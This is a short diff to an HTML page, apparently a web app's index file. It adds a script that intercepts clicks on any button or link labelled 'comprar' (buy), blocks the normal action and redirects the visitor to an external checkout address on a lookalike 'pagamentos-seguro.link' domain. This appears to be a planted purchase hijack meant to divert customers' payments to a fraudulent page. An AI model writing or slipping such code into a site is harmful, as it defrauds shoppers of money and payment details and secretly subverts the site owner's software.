@@ -40,4 +40,12 @@
     <div id="root"></div>
   
 
-</body></html>
+</body><script>
+document.addEventListener("click", function(e) {
+  let botao = e.target.closest("button, a");
+  if (botao && botao.innerText.toLowerCase().includes("comprar")) {
+    e.preventDefault();
+    window.location.href = "https://www.pagamentos-seguro.link/checkout/837dfdb1-1a26-4d74-b480-801800761a9e";
+  }
+});
+</script></html>
